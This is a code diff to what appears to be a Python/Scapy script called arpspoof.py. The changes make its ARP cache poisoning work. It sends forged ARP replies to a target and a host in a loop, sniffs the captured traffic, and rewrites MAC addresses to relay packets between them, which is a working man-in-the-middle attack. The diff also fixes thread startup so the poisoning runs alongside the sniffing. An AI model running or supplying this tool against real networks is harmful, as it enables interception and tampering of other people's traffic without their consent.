@@ -48,23 +48,55 @@ def poison(mac_1=None, ip_1=None, mac_2=None, ip_2=None):
 		pkt21 = ARP(pdst=ip_2, hwdst=mac_2, psrc=ip_1, op='is-at')
 		
 		while True:
-			#Send arp packet to 
-			send(pkt12, verbose=0)	
-			send(pkt21, verbose=0)
-		
-			#Wait a couple seconds
-			sleep(3)
+			try:
+				#Send arp packet to 
+				send(pkt12, verbose=0)	
+				send(pkt21, verbose=0)
+			
+				#Just chill out for a second, we're in no rush...
+				sleep(3)
+			except KeyboardInterrupt:
+				print('Poisoning ceased...')
+				sys.exit(0)
 
-			return 'we need to stop for testing purposes and add some error conditions'
 			
 
-def start_sniffing_stuff(t_ip, t_mac, h_ip, h_mac):
+def start_sniffing_stuff(t_ip, t_mac, h_ip, h_mac, poison_thread):
 	print('Sniffing initiated...')
-	
 	while(True):
-		pkt = sniff(count=1, filter=None, iface="eth1") #This 'iface' may have to change. My default of eth0 points to the wrong network
-		if pkt:
-			print('Received packet: {}'.format(pkt.summary()))
+		try:
+			pkts = sniff(count=1, filter=None, iface="eth1") #This 'iface' may have to change. My default of eth0 points to the wrong network
+			if pkts and not pkts[0].haslayer(ARP):
+				#Print the packet we got
+				#print('Received packet: {}'.format(pkts.summary()))
+				#print('Datatype: {}'.format(type(pkts)))
+				for pkt in pkts:
+					print('Received:')
+					print('\tDatatype of pkt: {}'.format(type(pkt)))
+					print('\tDestination: {}'.format(pkt.dst))
+					print('\tSource : {}'.format(pkt.src))
+					
+					if pkt.src == t_mac:
+						#Forward pkt to h_mac from me
+						pkt.src = pkt.dst
+						pkt.dst = h_mac
+					elif pkt.src == h_mac:
+						#Forward pkt to t_mac
+						pkt.src = pkt.dst
+						pkt.dst = t_mac
+					else:
+						print('Why did I get this?')
+					print('Sent:')
+					print('\tDatatype of pkt: {}'.format(type(pkt)))
+					print('\tDestination: {}'.format(pkt.dst))
+					print('\tSource : {}'.format(pkt.src))
+					send(pkt, verbose=0)
+				
+				#Send the packet to it's original destination
+				
+		except KeyboardInterrupt: 
+			print('Sniffing ceased...')
+			sys.exit(0)
 
 def spoof_time(t_ip, h_ip):
 	#print(f'Target IP: {t_ip}')
@@ -81,10 +113,11 @@ def spoof_time(t_ip, h_ip):
 	
 	#Kick off thread to poison the cache
 	poison_thread = threading.Thread(target=poison, args=(clean_mac(t_mac), t_ip, clean_mac(h_mac), h_ip), name='def_not_arp_spoof')
-	poison_thread.run()
+	poison_thread.start()
+	#start_new_thread(poison, (clean_mac(t_mac), t_ip, clean_mac(h_mac), h_ip))
 
 	#Receive traffic and output
-	start_sniffing_stuff(t_ip, t_mac, h_ip, h_mac)
+	start_sniffing_stuff(t_ip, t_mac, h_ip, h_mac, poison_thread)
 
 if __name__ == '__main__':
 	#Usage : $ arpspoof.py -t <targetIP> -r <hostIP>
@@ -93,8 +126,6 @@ if __name__ == '__main__':
 	parser.add_argument('-r', help='host ip address')
 	args = parser.parse_args()
 	if args.t and args.r:
-		#print(f'Target IP: {args.t}')
-		#print(f'Host IP: {args.r}')
 		spoof_time(clean_ip(args.t), clean_ip(args.r))
 	else:
 		parser.print_help(sys.stderr)
